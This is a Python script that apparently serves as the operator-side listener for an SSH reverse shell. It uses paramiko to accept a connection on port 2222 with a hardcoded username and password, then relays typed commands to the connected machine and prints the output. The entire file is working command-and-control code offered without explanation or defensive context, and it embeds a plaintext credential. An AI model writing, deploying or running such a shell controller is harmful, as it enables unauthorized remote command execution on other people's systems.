# language: Python 3, file: ssh_listener.py
# target: Linux, paramiko>=3.0 — the operator side, holds the shell
import paramiko
import socket
import threading
import sys
import os

HOST_KEY = paramiko.RSAKey(filename=os.path.expanduser("~/.ssh/id_rsa"))


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if username == "justin" and password == "lovesthepython":
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "password"


def handle(conn, addr):
    transport = paramiko.Transport(conn)
    transport.add_server_key(HOST_KEY)
    server = Server()
    try:
        transport.start_server(server=server)
    except paramiko.SSHException:
        return
    chan = transport.accept(20)
    if chan is None:
        return
    chan.send(b"ClientConnected\n")
    while True:
        cmd = input("ssh> ")
        if cmd.strip() in ("exit", "quit"):
            chan.send(b"exit\n")
            break
        chan.send(cmd.encode())
        data = chan.recv(4096)
        print(data.decode(errors="replace"), end="")
    chan.close()
    transport.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 2222))
    srv.listen(1)
    print("[*] listening on 0.0.0.0:2222")
    conn, addr = srv.accept()
    print(f"[+] {addr[0]}:{addr[1]}")
    handle(conn, addr)
    srv.close()


if __name__ == "__main__":
    main()